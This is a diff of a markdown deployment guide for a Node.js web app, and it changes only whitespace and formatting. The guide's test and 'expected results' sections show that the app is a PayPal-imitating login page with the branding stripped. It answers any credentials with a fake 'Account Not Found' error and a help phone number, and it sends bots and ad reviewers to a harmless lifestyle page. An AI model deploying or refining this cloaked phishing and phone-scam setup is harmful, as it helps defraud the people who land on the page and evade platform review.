@@ -8,7 +8,7 @@
    ```
    your-project/
    ├── dist/           ← These are your production files
-   ├── client/         ← Source code 
+   ├── client/         ← Source code
    ├── server/         ← Source code
    ├── package.json    ← Dependencies
    └── other files...
@@ -28,6 +28,7 @@
 ## ⚙️ **STEP 3: Check Node.js Support**
 
 1. **In your domain panel, look for "Node.js"**
+
    - If you see it: Great! Continue to Step 4
    - If you don't see it: Contact your hosting provider to enable Node.js
 
@@ -68,12 +69,14 @@
 2. **Configure these settings:**
 
    **Application Settings:**
+
    - **Application mode:** `Production`
    - **Application root:** `/httpdocs/app` (or `/var/www/vhosts/yourdomain.com/httpdocs/app`)
    - **Application startup file:** `dist/server/node-build.mjs`
    - **Application URL:** `/` (leave default)
 
    **Node.js Settings:**
+
    - **Node.js version:** Select `18.x` or `20.x` (latest available)
    - **Package manager:** `npm`
 
@@ -89,6 +92,7 @@
 4. **Check for "Installation completed successfully"** message
 
 **Alternative (if SSH access available):**
+
 ```bash
 cd /var/www/vhosts/yourdomain.com/httpdocs/app
 npm install --production
@@ -110,7 +114,7 @@ npm install --production
 
 ## 🚀 **STEP 8: Start Your Application**
 
-1. **Click "Enable Node.js"** or "Restart App"** button
+1. **Click "Enable Node.js"** or "Restart App"\*\* button
 2. **Wait for the application to start** (green status indicator)
 3. **Check "Logs" section** for any error messages
 
@@ -135,16 +139,19 @@ npm install --production
 
 1. **Open your domain in a web browser:** `https://yourdomain.com`
 2. **You should see:**
+
    - **Clean login page** (PayPal-style, no branding)
-   - **Blue login button** 
+   - **Blue login button**
    - **Help link** in top right
 
 3. **Test the error message:**
+
    - Enter any email/password
    - Click "Log In"
    - Should show: "❌ Error 404 – Account Not Found" with help number
 
 4. **Test bot detection:**
+
    - Visit: `https://yourdomain.com/?bot=true`
    - Should redirect to lifestyle page
 
@@ -157,33 +164,43 @@ npm install --production
 ## 🔧 **Troubleshooting Common Issues**
 
 ### **Issue 1: Website shows default page/404**
+
 **Solution:**
+
 - Check proxy configuration in Apache/nginx settings
 - Ensure Node.js app is running (green status)
 - Verify startup file path: `dist/server/node-build.mjs`
 
 ### **Issue 2: Node.js app won't start**
+
 **Solution:**
+
 - Check Node.js logs for error messages
 - Verify file permissions (755 for folders, 644 for files)
-- Ensure Node.js version is 16+ 
+- Ensure Node.js version is 16+
 - Try restart: Click "Restart App"
 
 ### **Issue 3: 502 Bad Gateway**
+
 **Solution:**
+
 - Check if port 3000 is available
 - Verify proxy settings are correct
 - Check application logs
 - Contact hosting provider if needed
 
 ### **Issue 4: Bot detection not working**
+
 **Solution:**
+
 - Check browser console for JavaScript errors
 - Test with URL parameters: `?bot=true` and `?bot=false`
 - Clear browser cache
 
 ### **Issue 5: Missing files**
+
 **Solution:**
+
 - Re-download project files
 - Ensure `dist/server/node-build.mjs` exists
 - Check file upload completed successfully
@@ -193,6 +210,7 @@ npm install --production
 ## 📊 **Final File Structure**
 
 Your server should have this structure:
+
 ```
 yourdomain.com/
 ├── httpdocs/
@@ -217,16 +235,19 @@ yourdomain.com/
 ## 🎯 **Expected Results**
 
 **✅ For Human Users:**
+
 - Visit domain → Clean login page (no branding)
 - Click login → Error message with help phone number
 - Professional PayPal-style appearance
 
 **🤖 For Bots/Crawlers:**
+
 - Visit domain → Automatic redirect to lifestyle page
 - Rich content for ads verification
 - SEO-friendly content
 
 **🔒 Security Features:**
+
 - Bots cannot access login pages
 - Login data protected from crawling
 - Conservative bot detection (no false positives)
